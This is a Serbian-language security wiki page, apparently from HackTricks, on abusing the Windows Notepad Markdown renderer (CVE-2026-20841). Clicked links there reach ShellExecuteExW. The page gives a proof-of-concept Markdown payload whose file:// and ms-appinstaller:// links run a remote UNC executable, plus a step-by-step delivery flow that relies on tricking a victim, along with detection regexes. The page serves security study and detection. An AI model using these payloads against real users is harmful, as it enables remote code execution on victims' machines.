# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Windows aplikacije koje prikazuju Markdown ili HTML mogu proslediti kliknute ciljeve funkciji `ShellExecuteExW`. Pošto ShellExecute prosleđuje URI šeme i asocijacije datoteka koje su registrovane, renderer treba da koristi eksplicitnu allowlist-u umesto da pretpostavlja da je svaka veza HTTP(S). Ponašanje Notepad-a opisano u nastavku odnosi se na CVE-2026-20841 i ne treba ga uopštavati na sve renderere.<sup>[[1]](#references)[[3]](#references)</sup>

## ShellExecuteExW površina napada u Windows Notepad režimu Markdown
- Notepad bira Markdown režim **samo za ekstenzije `.md`** koristeći fiksno poređenje stringova u `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Podržane Markdown veze:
  - Standardna: `[text](target)`
  - Autolink: `<target>` (prikazuje se kao `[target](target)`), zato su obe sintakse važne za payload-e i detekcije.
- Klikovi na veze obrađuju se u `sub_140170F60()`, koji sprovodi slabo filtriranje, a zatim poziva `ShellExecuteExW`.
- `ShellExecuteExW` prosleđuje **bilo kom konfigurisanom protocol handler-u**, ne samo HTTP(S).<sup>[[1]](#references)</sup>

### Razmatranja o payload-u
- Sve sekvence `\\` u vezi **normalizuju se u `\`** pre poziva `ShellExecuteExW`, što utiče na kreiranje UNC putanja/putanja i detekciju.
- `.md` datoteke **podrazumevano nisu povezane sa Notepad-om**; žrtva i dalje mora da otvori datoteku u Notepad-u i klikne na vezu, ali kada se prikaže, veza može da se klikne.
- Primeri opasnih šema:<sup>[[1]](#references)</sup>
  - `file://` za pokretanje lokalnog/UNC payload-a.
  - `ms-appinstaller://` za pokretanje App Installer procesa. I druge lokalno registrovane šeme mogu biti zloupotrebljene.

### Minimalni PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Tok eksploatacije
1. Napravite **`.md` datoteku** tako da je Notepad prikaže kao Markdown.
2. Umetnite vezu koja koristi opasnu URI šemu (`file:`, `ms-appinstaller:` ili bilo koji instalirani handler).
3. Isporučite datoteku (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ili slično) i ubedite korisnika da je otvori u Notepad-u.
4. Klikom se **normalizovana veza** prosleđuje funkciji `ShellExecuteExW`, a odgovarajući protocol handler izvršava sadržaj na koji veza upućuje u kontekstu korisnika.<sup>[[1]](#references)[[2]](#references)</sup>

## Ideje za detekciju
- Pratite prenose `.md` datoteka preko portova/protokola koji se uobičajeno koriste za isporuku dokumenata: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parsirajte Markdown veze (standardne i autolink) i tražite `file:` ili `ms-appinstaller:` **bez obzira na veličinu slova**.
- Regex obrasci zasnovani na smernicama proizvođača za otkrivanje pristupa udaljenim resursima:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Popravka dobavljača koju opisuje ZDI ograničava prihvaćene ciljeve na lokalne datoteke i HTTP(S). Po potrebi proširite detekcije i na druge instalirane rukovaoce protokolima, jer se registrovana površina napada razlikuje od sistema do sistema.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Proizvoljno izvršavanje koda u Windows Notepad-u](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
